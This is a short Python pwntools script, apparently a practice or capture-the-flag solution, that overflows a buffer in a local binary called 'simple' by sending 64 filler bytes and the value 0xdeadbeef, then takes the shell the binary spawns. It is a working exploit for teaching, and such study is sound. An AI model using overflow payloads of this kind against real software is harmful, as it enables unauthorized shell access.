from pwn import *

# As we saw using gdb, "simple" binary makes a comparison with this value
CALL_ME = 0xdeadbeef

# We run the process "simple"
s = process("./simple")



#gdb.attach(s, 'b *0x00481203')

# And write this payload as input to take advantage 
# of the buffer overflow bug that we found
payload = 'A'*64
payload += p32(CALL_ME) # p32() function helps us with the little endian concatenation
			# of our data (since x86 arch uses little-endian byte ordering)
payload += '\n'


#print(payload)

# Send payload to the input function

s.sendline(payload)

# Make process interactive (since the binary executes a shell if we
# bypass the if statement
s.interactive()

## Show process output in our shell
#print(s.recv())

s.close()
